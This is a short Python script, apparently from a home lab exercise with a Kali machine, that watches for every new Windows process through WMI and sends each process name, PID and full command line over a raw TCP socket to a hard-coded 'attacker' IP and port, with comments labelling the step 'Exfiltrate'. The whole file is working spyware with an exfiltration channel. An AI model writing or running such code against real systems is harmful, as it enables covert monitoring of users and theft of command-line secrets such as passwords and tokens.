import wmi
import socket
import sys

# ==========================================
# CONFIGURATION
# ==========================================
ATTACKER_IP = "192.168.72.111"  # Kali IP
ATTACKER_PORT = 9999  # Kali Port


def send_data(log_message):
    """
    Sends the captured log to the attacker.
    """
    try:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)  # Don't wait forever

        # Connect to Kali
        s.connect((ATTACKER_IP, ATTACKER_PORT))

        # Send the data
        s.send(f"{log_message}\n".encode())
        s.close()

        print(f"[+] Sent to Kali: {len(log_message)} bytes")

    except Exception as e:
        # If this prints, your Netcat listener is likely DEAD.
        print(f"[!] SEND ERROR: {e}")


def monitor():
    print(f"[*] Initializing WMI Process Watcher...")
    c = wmi.WMI()
    watcher = c.Win32_Process.watch_for("creation")

    print(f"[*] Monitor Active! Sending logs to {ATTACKER_IP}:{ATTACKER_PORT}")
    print("[*] Waiting for new processes (Open Calculator now!)...")

    while True:
        try:
            # 1. Wait for a process (BLOCKING)
            proc = watcher()

            # 2. Extract Data
            name = proc.Caption
            cmd = proc.CommandLine or ""
            pid = proc.ProcessId

            # 3. Format
            evidence = f"Captured: {name} (PID: {pid}) | CMD: {cmd}"

            # 4. Print Locally (Verification)
            print(f"\n[>] {evidence}")

            # 5. Exfiltrate
            send_data(evidence)

        except Exception as e:
            print(f"[!] WMI LOOP ERROR: {e}")


if __name__ == '__main__':
    monitor()
